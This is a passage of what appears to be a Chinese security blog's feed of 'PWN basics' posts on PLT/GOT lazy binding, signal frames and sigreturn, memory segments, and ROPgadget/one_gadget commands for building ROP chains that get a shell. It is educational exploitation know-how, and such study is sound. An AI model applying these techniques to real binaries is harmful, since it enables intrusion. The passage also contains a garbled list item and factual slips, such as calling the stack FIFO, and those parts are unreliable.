GOT 中存放着全局变量和函数调用，现在把他拆成另个部分 .got 和 .got.plt，用 .got 存放着全局变量引用，用 .got.plt 存放着函数引用</strong>。<br>查看 test@plt 代码，用 <code>objdump -Mintel -d -j .plt got</code></p><blockquote><p>-Mintel 选项指定 intel 汇编语法<br>-d 选项展示可执行文件节的汇编形式<br>-j 选项后面跟上节名，指定节</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00001060 &lt;<span class="built_in">test</span>@plt&gt;:  </span><br><span class="line">1060: ff a3 14 00 00 00 jmp DWORD PTR [ebx+0x14]  </span><br><span class="line">1066: 68 10 00 00 00 push 0x10  </span><br><span class="line">106b: e9 c0 ff ff ff jmp 1030 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><p>查看 main()函数 中调用 test@plt 的反汇编代码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">11ee: e8 <span class="built_in">cd</span> fe ff ff call 10c0 &lt;__x86.get_pc_thunk.bx&gt;  </span><br><span class="line">11f3: 81 c3 0d 2e 00 00 add ebx,0x2e0d  </span><br><span class="line">11f9: e8 bb ff ff ff call 11b9 &lt;fun&gt;  </span><br><span class="line">11fe: e8 5d fe ff ff call 1060 &lt;<span class="built_in">test</span>@plt&gt;</span><br></pre></td></tr></table></figure></p><p><code>__x86.gett_pc_thunk.bx</code>函数与之前的 <code>__x86.get_pc_thunk.ax</code>功能一样 ，得出 ebx = 0x11f3 + 0x2e0d = 0x4000 ，ebx + 0x14 = 0x4014 。首先 jmp 指令，跳转到 0x4014 这个地址，这个地址在 .got.plt 节中 ：<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125134945.png" alt="Pasted image 20250125134945"><br>也就是当程序需要调用到其他模块中的函数时例如 fun() ，就去访问保存在 .got.plt 中的 fun@plt 。这里有两种情况，第一种就是第一次使用这个函数，这个地方就存放着第二条指令的地址，也就相当于什么都不做。<br>用 <code>objdump -d -s got -j .got.plt</code> 命令查看节中的内容</p><blockquote><p>-s 参数显示指定节的所有内容<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125135018.png" alt="Pasted image 20250125135018"></p></blockquote><p>4014 处存放着 66 10 00 00 ，因为是小端序所以应为 0x00001066，这个位置刚好对应着 push 0x10 这条指令，这个值是 test 这个符号在 .rel.plt 节中的下标。继续 jmp 指令跳到 .plt 处<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250125135342.png" alt="Pasted image 20250125135342"><br>push DWORD PTR [ebx + 0x4] 指令是将当前模块ID压栈，也就是 got.c 模块，接着 jmp DWORD PTR [ebx + 0x8] ，这个指令就是跳转到 <strong>动态链接器</strong> 中的 <code>_dl_runtime_resolve</code>函数中去。这个函数的作用就是在另外的模块中查找需要的函数，就是这里的在 got_extern.so 模块中的 test 函数。<br>然后<code>_dl_runtime_resolve</code>函数会将 test() 函数的真正地址填入到 test@got 中去也就是 .got.plt 节中。<br>那么第二种情况就是，当第二次调用test()@plt 函数时，就会通过第一条指令跳转到真正的函数地址。整个过程就是所说的通过 <strong>plt</strong> 来实现 <strong>延迟绑定</strong> 。程序调用外部函数的整个过程就是，第一次访问 test@plt 函数时，<strong>动态链接器</strong>就会去动态共享模块中查找 test 函数的真实地址然后将真实地址保存到test@got中(.got.plt)；第二次访问test@plt时，就直接跳转到test@got中去。</p><h3 id="简例"><a href="#简例" class="headerlink" title="简例"></a>简例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>编译</em></p><blockquote><p><code>gcc -Wall -g -o test.o -c test.c -m32</code></p></blockquote><p><em>链接</em></p><blockquote><p><code>gcc -o test test.o -m32</code></p><p>注意：现代Linux系统都是x86_64系统了，后面需要对中间文件test.o以及可执行文件test反编译，分析汇编指令，因此在这里使用-m32选项生成i386架构指令而非x86_64架构指令。</p></blockquote><p>经编译和链接阶段之后，test可执行文件中print_banner函数的汇编指令会是怎样的呢？我猜应该与下面的汇编类似：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">080483</span>cc &lt;print_banner&gt;:</span><br><span class="line"> <span class="number">80483</span>cc:    push %ebp</span><br><span class="line"> <span class="number">80483</span>cd:    mov  %esp, %ebp</span><br><span class="line"> <span class="number">80483</span>cf:    sub  $<span class="number">0x8</span>, %esp</span><br><span class="line"> <span class="number">80483</span>d2:    sub  $<span class="number">0xc</span>, %esp</span><br><span class="line"> <span class="number">80483</span>d5:    push $<span class="number">0x80484a8</span>  </span><br><span class="line"> <span class="number">80483</span>da:    call **&lt;<span class="built_in">printf</span>函数的地址&gt;**</span><br><span class="line"> <span class="number">80483</span>df:    add $<span class="number">0x10</span>, %esp</span><br><span class="line"> <span class="number">80483e2</span>:    nop</span><br><span class="line"> <span class="number">80483e3</span>:    leave</span><br><span class="line"> <span class="number">80483e4</span>:    ret</span><br></pre></td></tr></table></figure></p><p>print_banner函数内调用了printf函数，而printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。故上述的<code>**&lt;printf函数地址&gt;**</code>一项是无法填充的，只有进程运运行后，printf函数的地址才能确定。<br>那么问题来了：进程运行起来之后，glibc动态库也装载了，printf函数地址亦已确定，上述call指令如何修改（重定位）呢？<br>一个简单的方法就是将指令中的<code>**&lt;printf函数地址&gt;**</code>修改printf函数的真正地址即可。<br>但这个方案面临两个问题：</p><ul><li>现代操作系统不允许修改代码段，只能修改数据段</li><li>如果print_banner函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。<br>因此，printf函数地址只能回写到数据段内，而不能回写到代码段上。</li></ul><p>注意：刚才谈到的回写，是指运行时修改，更专业的称谓应该是<em>运行时重定位</em>，与之相对应的还有<em>链接时重定位</em>。<br>说到这里，需要把编译链接过程再展开一下。我们知道，每个编译单元（通常是一个.c文件，比如前面例子中的test.c）都会经历编译和链接两个阶段。<br>编译阶段是将.c源代码翻译成汇编指令的中间文件，比如上述的test.c文件，经过编译之后，生成test.o中间文件。print_banner函数的汇编指令如下（使用强调内容<em>objdump -d test.o</em>命令即可输出）：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> &lt;print_banner&gt;:</span><br><span class="line">      <span class="number">0</span>:  <span class="number">55</span>                   push %ebp</span><br><span class="line">      <span class="number">1</span>:  <span class="number">89</span> e5                mov %esp, %ebp</span><br><span class="line">      <span class="number">3</span>:  <span class="number">83</span> ec <span class="number">08</span>             sub   $<span class="number">0x8</span>, %esp</span><br><span class="line">      <span class="number">6</span>:  c7 <span class="number">04</span> <span class="number">24</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> movl  $<span class="number">0x0</span>, (%esp)</span><br><span class="line">      d:  e8 fc ff ff ff       call  e &lt;print_banner+<span class="number">0xe</span>&gt;</span><br><span class="line">     <span class="number">12</span>:  c9                   leave</span><br><span class="line">     <span class="number">13</span>:  c3                   ret</span><br></pre></td></tr></table></figure><br>是否注意到call指令的操作数是fc ff ff ff，翻译成16进制数是0xfffffffc（x86架构是小端的字节序），看成有符号是-4。这里应该存放printf函数的地址，但由于编译阶段无法知道printf函数的地址，所以预先放一个-4在这里，然后用重定位项来描述：<strong>这个地址在链接时要修正，它的修正值是根据printf地址（更确切的叫法应该是符号，链接器眼中只有符号，没有所谓的函数和变量）来修正，它的修正方式按相对引用方式。</strong></p><p>这个过程称为<em>链接时重定位</em>，与刚才提到的运行时重定位工作原理完全一样，只是修正时机不同。</p><p><em>链接阶段</em>是将一个或者多个中间文件（.o文件）通过链接器将它们链接成一个可执行文件，链接阶段主要完成以下事情：</p><blockquote><p>-各个中间文之间的同名section合并</p><ul><li>对代码段，数据段以及各符号进行地址分配</li><li>链接时重定位修正</li></ul></blockquote><p>除了重定位过程，其它动作是无法修改中间文件中函数体内指令的，而重定位过程也只能是修改指令中的操作数，换句话说，<strong>链接过程无法修改编译过程生成的汇编指令。</strong><br>那么问题来了：<strong>编译阶段怎么知道printf函数是在glibc运行库的，而不是定义在其它.o中</strong><br>答案：<strong>编译器是无法知道的</strong></p><p>那么编译器只能老老实实地生成调用printf的汇编指令，printf是在glibc动态库定位，或者是在其它.o定义这两种情况下，它都能工作。如果是在其它.o中定义了printf函数，那在链接阶段，printf地址已经确定，可以直接重定位。如果printf定义在动态库内（链接阶段是可以知道printf在哪定义的，只是如果定义在动态库内不知道它的地址而已），链接阶段无法做重定位。</p><p>根据前面讨论，运行时重定位是无法修改代码段的，只能将printf重定位到数据段。那在编译阶段就已生成好的call指令，怎么感知这个已重定位好的数据段内容呢？</p><p>答案是：<strong>链接器生成一段额外的小代码片段，通过这段代码支获取printf函数地址，并完成对它的调用。</strong><br>链接器生成额外的伪代码如下：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用printf的call指令</span></span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [<span class="built_in">printf</span>函数的储存地址] <span class="comment">// 获取printf重定位之后的地址</span></span><br><span class="line">    jmp rax <span class="comment">// 跳过去执行printf函数</span></span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line"><span class="built_in">printf</span>函数的储存地址：</span><br><span class="line">　　这里储存<span class="built_in">printf</span>函数重定位后的地址</span><br></pre></td></tr></table></figure><br>链接阶段发现printf定义在动态库时，链接器生成一段小代码print_stub，然后printf_stub地址取代原来的printf。因此转化为链接阶段对printf_stub做链接重定位，而运行时才对printf做运行时重定位。</p><h3 id="PLT-amp-GOT"><a href="#PLT-amp-GOT" class="headerlink" title="PLT &amp; GOT"></a>PLT &amp; GOT</h3><p>前面由一个简单的例子说明动态链接需要考虑的各种因素，但实际总结起来说两点：</p><blockquote><ul><li>需要存放外部函数的数据段</li><li>获取数据段存放函数地址的一小段额外代码</li></ul></blockquote><p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p><p>总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为<em>重局偏移表（GOT, Global Offset Table）</em>，而那个额外代码段表，称为<em>程序链接表（PLT，Procedure Link Table）</em>。</p><p><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250120211843.png" alt="Pasted image 20250120211843"><br>当然这个原理图并不是Linux下的PLT/GOT真实过程，Linux下的PLT/GOT还有更多细节要考虑了。这个图只是将这些躁声全部消除，让大家明确看到PLT/GOT是如何穿针引线的。</p><h2 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h2><p>程序开始执行时，.plt节和.got.plt节的状态如下：<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127193949.png" alt="Pasted image 20250127193949"></p><ul><li><code>printf@plt</code>是指plt节中与printf相关代码的地址，<code>printf@got</code>同理；</li><li><code>printf@plt+6</code>恰好是<code>get_address</code>的首地址；</li><li><code>*(printf@got)</code>是指地址为<code>printf@got</code>的内存单元中的数据（图中为<code>printf@plt+6</code>）</li><li><code>get_address</code>是一系列操作，该操作的功能是将printf在内存中的实际地址填写到<code>printf@got</code>这一地址对应的内存单元中。</li></ul><p>首次调用printf的程序执行流如下：<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127194035.png" alt="Pasted image 20250127194035"></p><ul><li>①：程序执行至<code>call printf@plt</code>，因此跳转至相应地址；</li><li>②：跳转到<code>printf@plt</code>后，执行<code>jmp *(printf@got)</code>，但由于<code>printf@got</code>保存的数据是<code>printf@plt+6</code>，因此程序又跳转至get_address的首地址；</li><li>③：程序执行<code>get_address</code>，将printf的真实地址写入<code>printf@got</code>中（图中未体现）</li></ul><p>当完成上述操作后，程序便能第一次执行printf。并且此时.plt节和.got.plt节的状态变为：<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/Pasted image 20250127194210.png" alt="Pasted image 20250127194210"><br>可以看到，此时printf@got中保存的地址变为了printf真正的首地址。<br>显然，后续再次执行<code>jmp *(printf@got)</code>命令时，程序可以直接跳转至printf的首地址，并执行相关命令。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础-something_about_操作系统</title>
      <link href="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h3><p><strong>signal 机制是类 unix 系统中进程之间<em>相互传递信息</em>的一种方法</strong>。一般，我们也称其为<strong>软中断信号</strong>，或者<strong>软中断</strong>。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般分为三大步：</p><blockquote><p>kill并不是字面意思——杀死进程<br>KILL功能描述：用于向任何进程组或进程发送信号</p><ol><li>内核向某个进程<strong>发送signal机制</strong>，该进程会被暂时<strong>挂起，进入内核态</strong></li><li>内核会为该进程保存相应的上下文，<strong>跳转到之前注册好的signal handler中处理signal</strong></li><li><strong>signal返回</strong></li><li>内核为进程恢复之前保留的上下文，恢复进程的执行<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Pasted image 20250207175656.png" alt="Pasted image 20250207175656"><br>内核在保存进程相应上下文阶段<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 <strong>Signal Frame</strong>。<em>需要注意的是，这一部分是在用户进程的地址空间的</em>。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。<br><img src="/2025/02/09/PWN%E5%9F%BA%E7%A1%80-something-about-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Pasted image 20250207175647.png" alt="Pasted image 20250207175647"><br>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext</li></ol><ul><li>x86<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//x86</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><ul><li>x64<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN基础-bss段、data段、text段、堆(heap)和栈(stack)</title>
      <link href="/2025/02/08/PWN%E5%9F%BA%E7%A1%80-bss%E6%AE%B5%E3%80%81data%E6%AE%B5%E3%80%81text%E6%AE%B5%E3%80%81%E5%A0%86-heap-%E5%92%8C%E6%A0%88-stack/"/>
      <url>/2025/02/08/PWN%E5%9F%BA%E7%A1%80-bss%E6%AE%B5%E3%80%81data%E6%AE%B5%E3%80%81text%E6%AE%B5%E3%80%81%E5%A0%86-heap-%E5%92%8C%E6%A0%88-stack/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="bss段"><a href="#bss段" class="headerlink" title="bss段"></a>bss段</h2><p>bss段（bss segment）通常是指用来存放程序中<strong>未初始化</strong>的全局变量的一块内存区域。<br>bss段属于静态内存分配。</p><h2 id="data段"><a href="#data段" class="headerlink" title="data段"></a>data段</h2><p>数据段（data segment）通常是指用来存放程序中<strong>已初始化</strong>的全局变量的一块内存区域。<br>数据段属于静态内存分配。</p><h2 id="text段"><a href="#text段" class="headerlink" title="text段"></a>text段</h2><p>代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。<br>这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。<br>在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p><h2 id="堆-heap"><a href="#堆-heap" class="headerlink" title="堆(heap)"></a>堆(heap)</h2><p>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。<br>当进程调用<strong>malloc</strong>等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；<br>当利用<strong>free</strong>等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p><h2 id="栈-stack"><a href="#栈-stack" class="headerlink" title="栈(stack)"></a>栈(stack)</h2><p><strong>栈又称堆栈</strong>，是用户存放程序<strong>临时创建的局部变量</strong>，<br>也就是说我们函数括弧“{}”中定义的变量（但<strong>不包括static声明的变量</strong>，static意味着在数据段中存放变量）。<br>除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。<br>由于栈的<strong>先进先出(FIFO)特点，所以栈特别方便用来保存/恢复调用现场。</strong></p><p><strong>从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</strong></p><h1 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h1><ul><li>全局的未初始化变量存在于.bss段中，具体体现为一个占位符；</li><li>xxxxxxxxxx7 1        　　DW      定义字(2字节).  2        PROC    定义过程.  3        ENDP    过程结束.  4        SEGMENT 定义段.  5        ASSUME  建立段寄存器寻址.  6        ENDS    段结束.  7        END    程序结束.C</li><li>函数内的自动变量都在栈上分配空间；</li><li>.bss是不占用.exe文件空间的，其内容由操作系统初始化（清零）；</li><li>.data却需要占用，其内容由程序初始化。因此造成了上述情况。</li><li>bss段（未手动初始化的数据）并不给该段的数据分配空间，只是记录数据所需空间的大小；</li><li>bss段的大小从可执行文件中得到 ，然后链接器得到这个大小的内存块，紧跟在数据段后面。</li><li>data段（已手动初始化的数据）则为数据分配空间，数据保存在目标文件中；</li><li>data段包含经过初始化的全局变量以及它们的值。当这个内存区进入程序的地址空间后全部清零。<br><strong>包含data段和bss段的整个区段此时通常称为数据区。</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具篇·ROPgadgets_and_One-gadget_RCE</title>
      <link href="/2025/02/08/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7ROPgadgets-and-One-gadget-RCE/"/>
      <url>/2025/02/08/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7ROPgadgets-and-One-gadget-RCE/</url>
      
        <content type="html"><![CDATA[<p>ROPgadget是一种基于代码复用技术的攻击工具，它可以帮助攻击者在二进制文件中找到可利用的代码片段（即ROP链中的gadgets），从而构建出有效的攻击载荷。以下是ROPgadget的基本使用方法：</p><h2 id="查找gadgets"><a href="#查找gadgets" class="headerlink" title="查找gadgets"></a>查找gadgets</h2><p>使用ROPgadget的基本命令格式是：<br><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ROPgadget <span class="literal">--binary</span> &lt;文件名&gt; <span class="literal">--only</span> &lt;gadgets类型&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>其中，&lt;文件名&gt;是你想要分析的二进制文件的路径，<gadgets类型>是你想要查找的gadgets的类型，比如“pop|ret”表示查找所有包含pop和ret指令的gadgets。</gadgets类型></p><h4 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h4><p><code>ROPgadget --binary example --string &quot;/bin/sh&quot;</code><br><code>ROPgadget --binary example --only &quot;int&quot;</code><br>例如，如果你想在名为example的二进制文件中查找所有的pop和ret gadgets，你可以使用以下命令：<br><code>ROPgadget --binary example --only &quot;pop|ret&quot;</code><br>jmp和ret<br><code>ROPgadget --binary b0verfl0w --only &quot;jmp|ret&quot;</code>ROPgadget —binary libc.so.6 —only “pop|ret” |grep “rax”<code>&quot;rax&quot;&quot;rdx&quot;&quot;rdi&quot;&quot;rcx&quot;&quot;rsi&quot;</code>one_gadget /path/to/binary`<br>ROPgadget会输出所有匹配的gadgets以及它们在二进制文件中的偏移地址。 </p><h2 id="分析gadgets"><a href="#分析gadgets" class="headerlink" title="分析gadgets"></a>分析gadgets</h2><p>查看ROPgadget的输出，分析哪些gadgets可以被用来构建ROP链。你需要找到一系列的gadgets，它们能够按顺序执行你想要的操作，比如改变寄存器的值、调用系统函数等。</p><h2 id="构建ROP链："><a href="#构建ROP链：" class="headerlink" title="构建ROP链："></a>构建ROP链：</h2><p>根据分析的结果，手动或使用自动化工具构建ROP链。ROP链是一系列gadgets的序列，当它们被连续执行时，能够完成攻击者的目标，比如执行任意代码或获取shell。</p><h2 id="测试ROP链："><a href="#测试ROP链：" class="headerlink" title="测试ROP链："></a>测试ROP链：</h2><p>在受控的环境中测试构建的ROP链，确保它能够按照预期工作。这通常涉及到在目标系统上触发漏洞并利用ROP链执行攻击。</p></blockquote><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ROPgadget 的使用说明如下：</span><br><span class="line">用法：ROPgadget [-<span class="type">h</span>] [-<span class="type">v</span>] [-<span class="type">c</span>] [--<span class="type">binary</span> &lt;<span class="type">binary</span>&gt;] [--<span class="type">opcode</span> &lt;<span class="type">opcodes</span>&gt;]</span><br><span class="line">[--<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;] [--<span class="type">memstr</span> &lt;<span class="built_in">string</span>&gt;] [--<span class="type">depth</span> &lt;<span class="type">nbyte</span>&gt;] [--<span class="type">only</span> &lt;<span class="type">key</span>&gt;]</span><br><span class="line">[--<span class="type">filter</span> &lt;<span class="type">key</span>&gt;] [--<span class="type">range</span> &lt;<span class="built_in">start-end</span>&gt;] [--<span class="type">badbytes</span> &lt;<span class="built_in">byte</span>&gt;]</span><br><span class="line">[--<span class="type">rawArch</span> &lt;<span class="type">arch</span>&gt;] [--<span class="type">rawMode</span> &lt;<span class="type">mode</span>&gt;] [--<span class="type">rawEndian</span> &lt;<span class="type">endian</span>&gt;] [--<span class="type">re</span> &lt;<span class="type">re</span>&gt;]</span><br><span class="line">[--<span class="type">offset</span> &lt;<span class="type">hexaddr</span>&gt;] [--<span class="type">ropchain</span>] [--<span class="type">thumb</span>] [--<span class="type">console</span>] [--<span class="type">norop</span>]</span><br><span class="line">[--<span class="type">nojop</span>] [--<span class="type">callPreceded</span>] [--<span class="type">nosys</span>] [--<span class="type">multibr</span>] [--<span class="type">all</span>] [--<span class="type">noinstr</span>]</span><br><span class="line">[--<span class="type">dump</span>] [--<span class="type">silent</span>] [--<span class="type">align</span> <span class="type">ALIGN</span>] [--<span class="type">mipsrop</span> &lt;<span class="type">rtype</span>&gt;]</span><br><span 